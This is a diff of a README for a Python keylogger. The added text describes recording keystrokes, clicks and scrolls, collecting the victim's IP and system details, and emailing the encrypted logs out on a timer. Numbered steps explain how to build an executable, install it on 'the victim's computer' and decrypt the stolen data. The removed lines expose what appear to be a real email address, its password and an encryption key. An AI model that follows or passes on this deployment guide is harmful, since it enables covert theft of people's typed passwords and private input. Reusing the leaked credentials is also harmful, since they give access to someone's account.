@@ -1,5 +1,7 @@
 # Keylogger
 
+Program uses the pynput library to track the keys pressed on the keyboard and where mouse clicks occurred or where the victim scrolled. Additionally the program steals information about the victim's computer, such as: ip data, system and its version, hostname. Every defined amount of time, the program sends an encrypted e-mail with all informations (computer infor + keys logged). 
+
 ## Libraries used
 
 ```python
@@ -18,20 +20,13 @@ from pynput.keyboard import Listener as KeyboardListener
 paste in the keylogger.py program.
 2. In the code of the keylogger.py program at the bottom, fill in the fields:
 ```python
-SEND_REPORT_EVERY = 20 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "dysk2115@gmail.com"
-EMAIL_PASSWORD = "Tutajwojtek1"
-.
-.
-.
-keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email",key="tKFQ4BGUYMR8iPH8otfSPy2z_uvhu7yQN3yL36cZy-E=")
+email_address = "your email"
+password = "your password"
+key ="your key"
 ```
-3. Using the auto-py-to-exe program, we generate the keylogger exe file
-4. Install the keylogger.exe program on the victim's computer (installation scenario)
-5. After receiving an email with encrypted data, we copy it to the e_keys_logged.txt file,
-In the DecryptFile.py program, we set the key and the path under which we have the file
-e_keys_logged.txt. We run the program, as a result of the program's operation, it is created
-keys_logged.txt file containing decrypted data from the victim's computer.
+3. Using the auto-py-to-exe program, generate keylogger exe file
+4. Install the keylogger.exe program on the victim's computer ("How to install" section)
+5. After receiving an email with encrypted data, copy it to the e_keys_logged.txt file, in the DecryptFile.py program, set the key and the path with the file e_keys_logged.txt. Run the program, as a result of the program's operation, keys_logged.txt file is created, which contains decrypted data from the victim's computer.
 
 ## How to install
 
